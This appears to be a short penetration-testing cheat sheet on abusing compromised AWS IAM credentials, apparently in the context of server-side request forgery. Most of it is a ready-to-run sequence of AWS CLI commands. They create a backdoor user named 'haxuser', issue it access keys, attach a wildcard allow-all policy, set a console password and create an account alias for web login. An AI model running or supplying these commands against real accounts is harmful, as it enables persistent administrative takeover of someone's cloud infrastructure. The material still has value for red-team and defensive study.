# Identity and Access Management

IAM credential It can be used to access other cloud services such as the S3 bucket or container registry. 
If an admin identity is attached to the instance or the identity is provisioned with excessive privileges, attackers can compromise the entire cloud infrastructure.


```
aws iam create-user --user-name haxuser
aws iam create-access-key --user-name haxuser
aws iam create-group --group-name haxuser
#Assign group policy for temp group granting all access
aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document '{"Version":"2012-10-17", "Statement": [{"Sid": "Stmt1437414476731", "Action": "*", "Effect": "Allow", "Resource": "*" }]}'
# Add temp user to temp group
aws iam add-user-to-group --group-name haxuser --user-name haxuser

#Create a login profile for temp user with a SUPER COOL password
aws iam create-login-profile --user-name haxuser --password 'SuperDuperCoolPassword'

#Create an account alias so you can access the account web console
aws iam create-account-alias --account-alias haxuseralias
hxxps://haxuseralias.signin.aws.amazon.com/console/
```

* ref https://d47zm3.me/resources/infosec/cloud-security/
* ref https://unit42.paloaltonetworks.com/server-side-request-forgery-exposes-data-of-technology-industrial-and-media-organizations/

